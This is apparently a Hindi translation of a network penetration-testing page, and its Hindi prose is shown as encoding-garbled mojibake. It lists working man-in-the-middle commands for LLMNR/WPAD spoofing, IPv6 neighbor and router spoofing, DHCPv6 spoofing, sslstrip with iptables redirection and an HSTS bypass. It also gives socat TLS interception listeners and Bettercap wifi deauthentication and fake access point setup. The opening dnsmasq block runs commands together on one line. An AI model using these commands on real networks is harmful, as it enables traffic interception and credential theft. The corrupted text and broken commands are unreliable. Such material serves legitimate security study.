**dnsmasq рдХреЗ рд╕рд╛рде рдЕрдкрдирд╛ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### рд╕реНрдерд╛рдиреАрдп рдЧреЗрдЯрд╡реЗ

рдЕрдХреНрд╕рд░ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП рдХрдИ рдорд╛рд░реНрдЧ рдореМрдЬреВрдж рд╣реЛрддреЗ рд╣реИрдВред рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ MAC рдкрддреЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж, _gateway-finder.py_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ IPv4 рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВред
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS, рдФрд░ mDNS рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕рд┐рд╕реНрдЯрдореНрд╕ рд▓рд┐рдВрдХ-рд▓реЛрдХрд▓ рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдиреЗрдо рд░рд┐рдЬрд╝реЛрд▓реНрдпреВрд╢рди (LLMNR) рдФрд░ рдиреЗрдЯрдмрд╛рдпреЛрдПрд╕ рдиреЗрдо рд╕рд░реНрд╡рд┐рд╕ (NBT-NS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИред рдПрдкреНрдкрд▓ рдмреЙрдирдЬреЛрд░ рдФрд░ рд▓рд┐рдирдХреНрд╕ рдЬреАрд░реЛ-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдЗрдореНрдкреНрд▓реАрдореЗрдВрдЯреЗрд╢рди рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS (mDNS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдереЗрдВрдЯрд┐рдХреЗрдЯреЗрдб рдирд╣реАрдВ рд╣реИрдВ рдФрд░ UDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрджреЗрд╢ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рддреЗ рд╣реИрдВ; рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдЗрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдХреНрддрд╛рдУрдВ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣рд╛рдБ [рдХреИрд╕реЗ Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [WPAD рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

рдХрдИ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛ-рдбрд┐рд╕реНрдХрд╡рд░реА (WPAD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдПрдХ WPAD рд╕рд░реНрд╡рд░ рдХрд┐рд╕реА рднреА рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдиреЗ рдЬрд╛рдиреЗ рдкрд░ рдЧреНрд░рд╛рд╣рдХ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* DHCP, рдХреЛрдб 252 рдПрдВрдЯреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ
* DNS, рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ _wpad_ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдЦреЛрдЬ
* рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ LLMNR рдФрд░ NBT-NS (DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓рддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ)

Responder WPAD рд╣рдорд▓рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИтАФрдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ DHCP, DNS, LLMNR, рдФрд░ NBT-NS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА WPAD рд╕рд░реНрд╡рд░ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред\
рдпрд╣рд╛рдБ [рдХреИрд╕реЗ Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### [SSDP рдФрд░ UPnP рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛](spoofing-ssdp-and-upnp-devices.md)

рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЛ рдХреБрдЫ рд╕рд╛рджрд╛-рдкрд╛рда рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджреЗ рд╕рдХреЗрдВред **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**SSDP рдФрд░ UPnP рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛**](spoofing-ssdp-and-upnp-devices.md)** рдореЗрдВред**

### IPv6 Neighbor Spoofing

рдпрд╣ рд╣рдорд▓рд╛ ARP Spoofing рдХреЗ рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ IPv6 рд╡рд┐рд╢реНрд╡ рдореЗрдВ рд╣реИред рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдпрд╣ рдорд╛рдирдиреЗ рдкрд░ рд╡рд┐рд╡рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЧреЗрдЯрд╡реЗ рдХрд╛ IPv6 рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ MAC рд╣реИред
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 рд░рд╛рдЙрдЯрд░ рд╡рд┐рдЬреНрдЮрд╛рдкрди рд╕реНрдкреВрдлрд┐рдВрдЧ/рдлреНрд▓рдбрд┐рдВрдЧ

рдХреБрдЫ рдУрдПрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП рдЖрд░рдП рдкреИрдХреЗрдЯреНрд╕ рд╕реЗ рдЧреЗрдЯрд╡реЗ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЖрдИрдкреАрд╡реА6 рд░рд╛рдЙрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдУрдПрд╕ DHCPv6 рдкреИрдХреЗрдЯ рдХреЛ рдкрдврд╝рдХрд░ DNS рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ DHCPv6 рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЦреБрдж рдХреЛ DNS рдХреЗ рд░реВрдк рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗред DHCP рднреА рдкреАрдбрд╝рд┐рдд рдХреЛ рдПрдХ IPv6 рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (рдлреЗрдХ рдкреЗрдЬ рдФрд░ JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди)

## рдЗрдВрдЯрд░рдиреЗрдЯ рд╣рдорд▓реЗ

### sslStrip

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдореБрдЦреНрдп рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд┐рд╕реА **HTTP** рдкреЗрдЬ рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд░рдиреЗ рдХреА **рдХреЛрд╢рд┐рд╢** рдХрд░рддрд╛ рд╣реИ рдЬреЛ **HTTPS** рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реЛ рд░рд╣рд╛ рд╣реИред **sslStrip** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ **HTTP рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛** рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ **HTTPS рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛** рддрд╛рдХрд┐ рд╡рд╣ рдХрдиреЗрдХреНрд╢рди рдХреЛ **рд╕рд╛рджрд╛ рдЯреЗрдХреНрд╕реНрдЯ** рдореЗрдВ **рд╕реНрдирд┐рдл** рдХрд░ рд╕рдХреЗред
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf) рдорд┐рд▓реЗрдЧреАред

### sslStrip+ рдФрд░ dns2proxy HSTS рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

**sslStrip+ рдФрд░ dns2proxy** рдФрд░ **sslStrip** рдХреЗ рдмреАрдЪ **рдЕрдВрддрд░** рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП _**www.facebook.com**_ рдХреЛ _**wwww.facebook.com**_ (рдзреНрдпрд╛рди рджреЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд "**w**") рдореЗрдВ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЗрд╕ рдбреЛрдореЗрди рдХрд╛ рдкрддрд╛ рдЕрдЯреИрдХрд░ рдЖрдИрдкреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВрдЧреЗред рдЗрд╕ рддрд░рд╣, **рдЧреНрд░рд╛рд╣рдХ** _**wwww.facebook.com**_ (рдЖрдХреНрд░рдордХ) рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдЧрд╛ рд▓реЗрдХрд┐рди рдкреАрдЫреЗ рдХреЗ рд╕реНрдХреАрди рдореЗрдВ **sslstrip+** рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХрдиреЗрдХреНрд╢рди рдХреЛ https рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **www.facebook.com** рдХреЗ рд╕рд╛рде **рдмрдирд╛рдП рд░рдЦреЗрдЧрд╛**ред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ **рд▓рдХреНрд╖реНрдп HSTS рдХреЛ рдЯрд╛рд▓рдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _**wwww**.facebook.com_ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕реЗ **рдлреЗрд╕рдмреБрдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг HTTP рдореЗрдВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ рдкрд╣рд▓реЗ [http://www.faceook.com](http://www.faceook.com) рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рд╣реЛрдЧреА рдФрд░ https рдирд╣реАрдВред рдЗрд╕реЗ рдПрдХ http рдкреГрд╖реНрда рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдВрдХреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://www.bettercap.org/legacy/#hsts-bypass), [рдпрд╣рд╛рдБ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) рдФрд░ [рдпрд╣рд╛рдБ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly) рдорд┐рд▓реЗрдЧреАред

**sslStrip рдпрд╛ sslStrip+ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА HSTS рдирд┐рдпрдо рд╕рд╣реЗрдЬреЗ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "рдорд╣рддреНрд╡рдкреВрд░реНрдг" рдбреЛрдореЗрди рддрдХ рдкрд╣рд▓реА рдмрд╛рд░ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЗрд╕реЗ HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реА рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рд╣реЗрдЬреЗ рдЧрдП рдирд┐рдпрдо рдФрд░ рдЕрдиреНрдп рдЙрддреНрдкрдиреНрди рдирд┐рдпрдо рдЭрдВрдбрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** [**`includeSubdomains`**](https://hstspreload.appspot.com) **рддрд╛рдХрд┐ рдкрд╣рд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ _**wwww.facebook.com**_ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ _**facebook.com**_ HSTS рдХрд╛ рдЙрдкрдпреЛрдЧ `includeSubdomains` рдХреЗ рд╕рд╛рде рдХрд░рддрд╛ рд╣реИред**

рдХрд╛рд░реНрдп: easy-creds, evilgrade, metasploit, factory

## рдкреЛрд░реНрдЯ рдореЗрдВ TCP рд╕реБрдиреЗрдВ
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрдирдирд╛

#### рдХреБрдВрдЬреА рдФрд░ рдЖрддреНрдо-рд╕рд╛рдЗрди рдХреА рдЧрдИ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
рдХрднреА-рдХрднреА, рдЕрдЧрд░ рдЧреНрд░рд╛рд╣рдХ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕реАрдП рдПрдХ рд╡реИрдз рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рджреНрд╡рд╛рд░рд╛ рд╕рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╕реАрдП рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкрд░реАрдХреНрд╖рдг, рдЕрдиреБрд░реЛрдзрд┐рдд рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рд╕реНрд╡-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИред

рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдПрдХ рд╡реИрдз рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЬреЛ рдПрдХ рд╡реИрдз рд╕реАрдП рдирд╣реАрдВ рд╣реИред рдпрд╛ рд╡реИрдз рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рдПрдХ рдРрд╕реЗ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ рдбрд┐рдлреА рд╣реЗрд▓рдореИрди (рдЬрд┐рд╕рдореЗрдВ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЬрдм рдЧреНрд░рд╛рд╣рдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдПрдХ рдкреНрд░реЛрдм (рдЬреИрд╕реЗ рдПрдХ рд╣реИрд╢) рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирдХрд▓реА рдкреНрд░реЛрдм рднреЗрдЬреЗрдВ рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рдЧреНрд░рд╛рд╣рдХ рдЗрд╕реЗ рдирд╣реАрдВ рдЬрд╛рдВрдЪрддрд╛ред

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### рд╕рдХреНрд░рд┐рдп рдЦреЛрдЬ рдиреЛрдЯреНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЬрдм рдПрдХ UDP рдкреИрдХреЗрдЯ рдПрдХ рдЙрдкрдХрд░рдг рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ ICMP (рдкреЛрд░реНрдЯ рдЕрдкреНрд░рд╛рдкреНрдд) рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **ARP рдЦреЛрдЬ**

ARP рдкреИрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдХреМрди рд╕реЗ IPs рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ рдЙрд╕реЗ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред PC рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдХреЗрд╡рд▓ рд╡реЗ рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВ рд╣реА рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрдВрдЧреЗред

### **mDNS (рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS)**

